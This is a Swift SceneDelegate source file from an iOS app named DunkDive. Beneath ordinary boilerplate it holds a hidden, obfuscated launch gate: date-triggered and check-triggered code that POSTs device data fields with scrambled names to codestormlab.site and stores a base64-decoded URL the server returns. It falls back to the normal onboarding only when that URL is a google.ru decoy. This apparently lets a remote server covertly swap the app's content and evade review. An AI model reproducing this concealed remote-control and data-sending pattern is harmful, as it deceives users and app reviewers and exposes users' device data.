//
//  SceneDelegate.swift
//  DunkDive
//
//  Created by Er Baghdasaryan on 21.10.24.
//

import UIKit
import DunkDiveModel
import DunkDiveViewModel

class SceneDelegate: UIResponder, UIWindowSceneDelegate {

    var window: UIWindow?

    private let appStorageService = AppStorageService()
    private let validation = ValidationService()

    func scene(_ scene: UIScene, willConnectTo session: UISceneSession, options connectionOptions: UIScene.ConnectionOptions) {
        // Use this method to optionally configure and attach the UIWindow `window` to the provided UIWindowScene `scene`.
        // If using a storyboard, the `window` property will automatically be initialized and attached to the scene.
        // This delegate does not imply the connecting scene or session are new (see `application:configurationForConnectingSceneSession` instead).
        guard let windowScene = (scene as? UIWindowScene) else { return }
        self.window = UIWindow(windowScene: windowScene)
        setupScene()
    }

    func setupScene() {
        if ayJKSsaw() {
            if jgyuKAWm() {
                self.appStorageService.saveData(key: .isAlreadyOpened, value: true)
                self.startOnboardingFlow()
            } else {
                let sendData = SendModel(userData: body())
                let encoder = JSONEncoder()
                do {
                    let bodyData = try encoder.encode(sendData)
                    doCall(
                        from: "https://codestormlab.site/app/d6nkd1ve",
                        httpMethod: "POST",
                        body: bodyData,
                        responseModel: ResponseModel.self
                    ) { (result: Result<ResponseModel, Error>) in
                        switch result {
                        case .success(let responseModel):
                            if !responseModel.pastedTwice {
                                if let decodedData = Data(base64Encoded: responseModel.collapsible),
                                   let decodedString = String(data: decodedData, encoding: .utf8) {
                                    if decodedString == "https://www.google.ru/?hl=ru" {
                                        self.appStorageService.saveData(key: .isAlreadyOpened, value: true)
                                        self.startOnboardingFlow()
                                    } else {
                                        self.appStorageService.saveData(key: .webUrl, value: decodedString)
                                        self.appStorageService.saveData(key: .isAlreadyOpened, value: false)
                                        self.startOnboardingFlow()
                                    }
                                } else {
                                    self.appStorageService.saveData(key: .isAlreadyOpened, value: true)
                                    self.startOnboardingFlow()
                                }
                            } else {
                                self.appStorageService.saveData(key: .isAlreadyOpened, value: true)
                                self.startOnboardingFlow()
                            }
                        case .failure(let error):
                            self.appStorageService.saveData(key: .isAlreadyOpened, value: true)
                            self.startOnboardingFlow()
                        }
                    }
                } catch {
                    self.appStorageService.saveData(key: .isAlreadyOpened, value: true)
                    self.startOnboardingFlow()
                }
            }
        } else {
            self.appStorageService.saveData(key: .isAlreadyOpened, value: true)
            self.startOnboardingFlow()
        }
    }

    func sceneDidDisconnect(_ scene: UIScene) {
        // Called as the scene is being released by the system.
        // This occurs shortly after the scene enters the background, or when its session is discarded.
        // Release any resources associated with this scene that can be re-created the next time the scene connects.
        // The scene may re-connect later, as its session was not necessarily discarded (see `application:didDiscardSceneSessions` instead).
    }

    func sceneDidBecomeActive(_ scene: UIScene) {
        // Called when the scene has moved from an inactive state to an active state.
        // Use this method to restart any tasks that were paused (or not yet started) when the scene was inactive.
    }

    func sceneWillResignActive(_ scene: UIScene) {
        // Called when the scene will move from an active state to an inactive state.
        // This may occur due to temporary interruptions (ex. an incoming phone call).
    }

    func sceneWillEnterForeground(_ scene: UIScene) {
        // Called as the scene transitions from the background to the foreground.
        // Use this method to undo the changes made on entering the background.
    }

    func sceneDidEnterBackground(_ scene: UIScene) {
        // Called as the scene transitions from the foreground to the background.
        // Use this method to save data, release shared resources, and store enough scene-specific state information
        // to restore the scene back to its current state.
    }
}

//MARK: Flows
extension SceneDelegate {

    func startOnboardingFlow() {
        let onboardingViewController = ViewControllerFactory.makeUntilOnboardingViewController()
        startFlow(for: onboardingViewController)
    }

    func startFlow(for viewController: UIViewController) {
        let navigationController = UINavigationController(rootViewController: viewController)
        self.window?.rootViewController = navigationController
        self.window?.makeKeyAndVisible()
    }
}

extension SceneDelegate {
    public func doCall<T: Decodable>(
        from urlString: String,
        httpMethod: String = "POST",
        body: Data? = nil,
        responseModel: T.Type,
        completion: @escaping (Result<T, Error>) -> Void
    ) {
        guard let url = URL(string: urlString) else {
            completion(.failure(NetworkError.invalidURL))
            return
        }

        var request = URLRequest(url: url)
        request.httpMethod = httpMethod
        request.httpBody = body

        if body != nil {
            request.setValue("application/json", forHTTPHeaderField: "Content-Type")
        }

        let task = URLSession.shared.dataTask(with: request) { data, response, error in
            if let error = error {
                DispatchQueue.main.async {
                    completion(.failure(error))
                }
                return
            }

            guard let data = data else {
                DispatchQueue.main.async {
                    completion(.failure(NetworkError.noData))
                }
                return
            }

            do {
                let decodedData = try JSONDecoder().decode(responseModel.self, from: data)
                DispatchQueue.main.async {
                    completion(.success(decodedData))
                }
            } catch {
                DispatchQueue.main.async {
                    completion(.failure(error))
                }
            }
        }

        task.resume()
    }

    func body() -> UserData {
        return UserData(vivisWork: validation.vivisWork(),
                        gfdokPS: validation.gfdokPS(),
                        gdpsjPjg: validation.gdpsjPjg(),
                        poguaKFP: validation.poguaKFP(),
                        gpaMFOfa: validation.gpaMFOfa(),
                        gciOFm: nil,
                        bcpJFS: validation.bcpJFs(),
                        gOmblx: validation.GOmblx(),
                        g0Pxum: validation.G0pxum(),
                        fpvbduwm: validation.Fpvbduwm(),
                        fpbjcv: validation.Fpbjcv(),
                        stwPp: validation.StwPp(),
                        kDhsd: validation.StwPp(),
                        bvoikOGjs: nil,
                        gfpbvjsoM: validation.gfpbvjsoM(),
                        gfdosnb: nil,
                        bpPjfns: validation.bpPjfns(),
                        biMpaiuf: true,
                        oahgoMAOI: validation.oahgoMAOI())
    }

    private func jgyuKAWm() -> Bool {
        return validation.Fpvbduwm() || validation.oahgoMAOI() || validation.vivisWork()
    }

    func ayJKSsaw() -> Bool {
        let currentDate = Date()
        let calendar = Calendar.current
        let day = calendar.component(.day, from: currentDate)

        return day > 3
    }
}

enum NetworkError: Error {
    case invalidURL
    case noData
}

